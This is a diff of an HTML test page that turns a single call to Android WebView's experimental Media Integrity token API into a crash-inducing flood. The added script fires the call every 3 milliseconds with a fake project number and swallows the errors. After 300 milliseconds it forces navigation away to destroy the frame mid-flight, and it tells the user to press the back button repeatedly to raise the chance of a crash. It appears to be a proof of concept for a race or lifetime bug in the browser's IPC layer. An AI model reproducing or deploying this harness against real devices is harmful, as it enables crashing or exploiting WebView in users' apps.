@@ -3,77 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Integrity 测试</title>
+    <title>Media Integrity 轰炸发射台</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; background: #1a1a1a; color: #fff; text-align: center; }
-        .card { background: #2a2a2a; padding: 25px; border-radius: 16px; max-width: 500px; margin: 40px auto; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
-        .status-box { padding: 12px; margin: 15px 0; border-radius: 8px; font-weight: bold; font-size: 14px; text-align: left; background: #333; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background: #121212; color: #e0e0e0; text-align: center; }
+        .card { background: #1e1e1e; padding: 25px; border-radius: 16px; max-width: 500px; margin: 30px auto; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+        .status-box { padding: 15px; margin: 15px 0; border-radius: 8px; font-weight: bold; font-size: 14px; text-align: left; background: #2d2d2d; }
         .found { color: #34C759; border-left: 5px solid #34C759; }
         .not-found { color: #FF3B30; border-left: 5px solid #FF3B30; }
-        button { width: 100%; padding: 16px; font-size: 16px; background: #30D158; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; }
-        button:disabled { background: #555; cursor: not-allowed; }
-        .log-area { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 12px; text-align: left; max-height: 150px; overflow-y: auto; color: #00FF00; }
+        button { width: 100%; padding: 16px; font-size: 16px; background: #FF3B30; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; box-shadow: 0 4px 12px rgba(255,59,48,0.3); }
+        button:disabled { background: #444; color: #888; cursor: not-allowed; box-shadow: none; }
+        .counter { font-size: 28px; font-weight: bold; color: #FFD60A; margin: 15px 0; font-family: monospace; }
+        .log-area { margin-top: 20px; background: #000; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 12px; text-align: left; height: 180px; overflow-y: auto; color: #00FF00; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>🛡️ Media Integrity 链路测试</h2>
-        <p style="color: #aaa; font-size: 13px;">Mojom 规范版 (HTTPS 环境)</p>
+        <h2>🔥 Mojom 级加特林轰炸台</h2>
+        <p style="color: #aaa; font-size: 13px; margin-top: -5px;">对齐接口：window.android.webview.getExperimentalMediaIntegrityTokenProvider</p>
         
-        <div id="scanResult" class="status-box">正在检测 window.android.webview ...</div>
+        <div id="scanResult" class="status-box">正在全网扫描 API 挂载点...</div>
         
-        <button id="fireBtn" disabled>🔥 发射正牌 Mojo 请求</button>
+        <div class="counter" id="fireCount">000000</div>
         
-        <div class="log-area" id="consoleLog">=== 页面日志终端 ===<br></div>
+        <button id="fireBtn" disabled>💥 启动狂暴轰炸并闪现销毁</button>
+        
+        <div class="log-area" id="consoleLog">=== 轰炸日志终端 ===<br></div>
     </div>
 
     <script>
         const scanResultEl = document.getElementById('scanResult');
         const fireBtn = document.getElementById('fireBtn');
         const logEl = document.getElementById('consoleLog');
+        const fireCountEl = document.getElementById('fireCount');
+
+        let totalFired = 0;
+        let bombInterval = null;
 
         function printLog(msg) {
             logEl.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
             logEl.scrollTop = logEl.scrollHeight;
         }
 
-        // 1. 严格按照 Mojom 约定的命名空间进行校验
+        // 1. 严格按照 Mojom 规范进行路径检测 (window.android.webview)
         const hasApi = window.android && 
                       window.android.webview && 
                       typeof window.android.webview.getExperimentalMediaIntegrityTokenProvider === 'function';
 
         if (hasApi) {
             scanResultEl.className = "status-box found";
-            scanResultEl.innerHTML = `🎯 成功捕获 API！<br>路径: <strong>window.android.webview.getExperimentalMediaIntegrityTokenProvider</strong>`;
+            scanResultEl.innerHTML = `🎯 成功捕获正牌接口！<br>路径: window.android.webview.getExperimentalMediaIntegrityTokenProvider`;
             fireBtn.disabled = false;
-            printLog("Mojom 接口验证成功，环境就绪。");
+            printLog("Mojom 契约达成，随时可以开火。");
         } else {
             scanResultEl.className = "status-box not-found";
-            scanResultEl.innerHTML = `❌ 未找到接口。<br>请确认内核是否开启了 WebViewMediaIntegrity 的 Feature 开关。`;
-            printLog("错误：未找到 window.android.webview 对象或方法。");
+            scanResultEl.innerHTML = `❌ 未在这个 WebView 内核中发现该实验性 API。<br>请确认内核是否开启了 WebViewMediaIntegrity 的 Feature 开关。`;
+            printLog("错误：未找到指定命名空间或方法。");
         }
 
-        // 2. 触发 Mojo 通信
+        // 2. 轰炸核心逻辑
         fireBtn.onclick = function() {
             if (!hasApi) return;
 
-            printLog("正在组装参数并通过 Mojo 管道投递...");
-            
-            // 严格对齐 uint64 kMaxCloudProjectNumber 限制
-            const testParams = {
-                cloudProjectNumber: 123456789 
-            };
+            fireBtn.disabled = true;
+            printLog("🚀 正在将 Mojo IPC 管道拉满至 100%...");
 
-            window.android.webview.getExperimentalMediaIntegrityTokenProvider(testParams)
-            .then(function(provider) {
-                printLog("🎉 Java 层处理成功并返回！");
-                alert("Mojo 通道已调通！");
-            }).catch(function(err) {
-                // 只要 IPC 到了 Java 层，不管证书合不合规，我们的调用目的都达到了
-                printLog(`⚠️ IPC 已送达 Java 层（响应结果: ${err.name || err}）`);
-                alert("请求已砸进 Java 层，请去查看 Logcat！");
-            });
+            // ⚡ 核心：每 3 毫秒疯狂向 Java 层投递一次异步请求，挤爆主线程队列
+            bombInterval = setInterval(function() {
+                totalFired++;
+                // 动态更新前端计数器面板
+                fireCountEl.innerText = String(totalFired).padStart(6, '0');
+
+                window.android.webview.getExperimentalMediaIntegrityTokenProvider({
+                    cloudProjectNumber: 123456789 
+                }).catch(function(err) {
+                    // 静默吞掉报错（因为项目号是假的必然报错，但只要进入 Java 目的就达到了）
+                });
+            }, 3); 
+
+            printLog("⚠️ 警报：管道已过载！");
+            printLog("⏳ 300ms 后页面将自动强制切回主页销毁 Frame...");
+            printLog("👉 此时你也可以**疯狂猛按手机返回键**以加大崩溃概率！");
+
+            // 🕒 双重保险：300毫秒后自动执行本地跳转，此时 Java 层的销毁和前端队列的余弹会撞车
+            setTimeout(function() {
+                printLog("⏰ 倒计时结束，执行强行闪现跳转！");
+                clearInterval(bombInterval);
+                window.location.href = "index.html";
+            }, 300);
         };
     </script>
 </body>
